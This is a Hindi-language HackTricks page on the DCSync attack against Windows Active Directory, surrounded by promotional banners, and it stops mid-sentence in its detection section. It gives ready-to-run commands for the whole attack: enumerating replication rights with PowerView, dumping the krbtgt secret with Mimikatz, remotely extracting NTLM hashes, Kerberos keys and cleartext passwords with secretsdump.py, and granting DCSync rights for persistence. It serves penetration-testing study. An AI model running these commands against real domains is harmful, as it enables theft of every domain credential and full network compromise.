# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और दुनिया के **सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित **कार्यप्रवाहों** को आसानी से निर्मित करें और स्वचालित करें।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>शून्य से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी की **विज्ञापनित करना चाहते हैं HackTricks** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos को PRs जमा करके।

</details>

## DCSync

**DCSync** अनुमति इसका सिद्धांत है कि डोमेन स्वयं पर ये अनुमतियाँ होनी चाहिए: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।

**DCSync के बारे में महत्वपूर्ण नोट:**

* **DCSync हमला एक डोमेन कंट्रोलर के व्यवहार का अनुकरण करता है और अन्य डोमेन कंट्रोलर से जानकारी की प्रतिलिपि** मांगता है डायरेक्टरी रिप्लिकेशन सेवा रिमोट प्रोटोकॉल (MS-DRSR) का उपयोग करके। क्योंकि MS-DRSR एक मान्य और आवश्यक फ़ंक्शन है, इसे बंद या अक्षम किया नहीं जा सकता।
* डिफ़ॉल्ट रूप से केवल **डोमेन एडमिन, एंटरप्राइज एडमिन, व्यवस्थापक और डोमेन कंट्रोलर्स** समूहों को आवश्यक विशेषाधिकार होते हैं।
* यदि किसी खाते का पासवर्ड पलटने वाले एन्क्रिप्शन के साथ संग्रहीत है, तो Mimikatz में पासवर्ड को स्पष्ट पाठ में लौटाने का एक विकल्प उपलब्ध है।

### गणना

`powerview` का उपयोग करके जांचें कि किसके पास ये अनुमतियाँ हैं:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### स्थानिक शोषण
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### दूरस्थ संभावना
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` 3 फ़ाइलें उत्पन्न करता है:

* एक **NTLM हैश** के साथ
* एक **केरबेरोस कुंजी** के साथ
* NTDS से साफ-सुथरे पासवर्ड के साथ एक जिसमें किसी भी खातों के लिए [**पलटाव एन्क्रिप्शन**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) सक्षम है। आप पलटाव एन्क्रिप्शन के साथ उपयोगकर्ताओं को प्राप्त कर सकते हैं

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### स्थिरता

यदि आप डोमेन व्यवस्थापक हैं, तो आप `powerview` की सहायता से किसी भी उपयोगकर्ता को इस अनुमतियों को प्रदान कर सकते हैं:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
फिर, आप **यह जांच सकते हैं कि उपयोगकर्ता को सही रूप से असाइन किया गया था** 3 विशेषाधिकारों को खोजकर (आपको "ObjectType" फील्ड के अंदर विशेषाधिकारों के नाम देखने में सक्षम होना चाहिए):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### रोकथाम

* सुरक्षा घटना आईडी 4662 (ऑब्जेक्ट के लिए ऑडिट नीति सक्षम होनी चाहिए) - एक ऑब्जेक्ट पर एक कार्रवाई की गई थी
* सुरक्षा घटना आईडी 5136 (ऑब्जेक्ट के लिए ऑडिट नीति सक्षम होनी चाहिए) - एक निर्देशिका सेवा ऑब्ज
